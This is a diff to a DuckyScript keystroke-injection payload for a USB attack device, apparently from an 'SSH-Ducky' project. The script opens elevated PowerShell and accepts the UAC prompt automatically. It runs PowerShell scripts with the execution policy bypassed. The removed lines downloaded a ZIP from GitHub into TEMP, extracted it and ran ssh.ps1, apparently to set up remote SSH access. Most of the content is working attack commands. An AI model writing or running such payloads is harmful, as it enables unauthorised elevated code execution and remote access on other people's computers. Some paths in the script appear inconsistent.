@@ -10,42 +10,28 @@ REM Press Enter to select the PowerShell application
 RIGHTARROW
 DELAY 500
 DOWNARROW
-ENTER
 DELAY 500
-TAB
+ENTER
+DELAY 1000
+LEFTARROW
+DELAY 1000
 ENTER
 REM Press Alt+Y to allow execution of the script (UAC prompt)
 ALT y
 DELAY 500
 
-
-REM Download the ZIP file
-STRING Invoke-WebRequest -Uri "https://github.com/ToxySecurity/SSH-Ducky/archive/refs/heads/main.zip" -OutFile "$env:TEMP\repo.zip" -UseBasicParsing
-ENTER
-DELAY 5000
-
-
-REM Extract the ZIP file with -Force parameter
-STRING Expand-Archive -Path "$env:TEMP\repo.zip" -DestinationPath "$env:TEMP\repo" -Force
-ENTER
-DELAY 2000
-
-REM Navigate to the extracted repository folderd
-STRING cd "$env:TEMP\repo\SSH-Ducky-main"
+REM Change to the ducky folder
+STRING cd /media/CIRCUITPY/SSH Ducky
 ENTER
 DELAY 1000
+
+REM Run the PowerShell script
+STRING powershell -ExecutionPolicy Bypass -File script.ps1
+ENTER
+DELAY 1000
+
+
 
 STRING .\ssh.ps1
 ENTER
 DELAY 5000
-
-REM Cleanup temporary files
-STRING Remove-Item "$env:TEMP\repo.zip" -Force
-ENTER
-
-REM Close PowerShell
-REM STRING exit
-REM ENTER
-
-REM Delay for script completion
-DELAY 1000
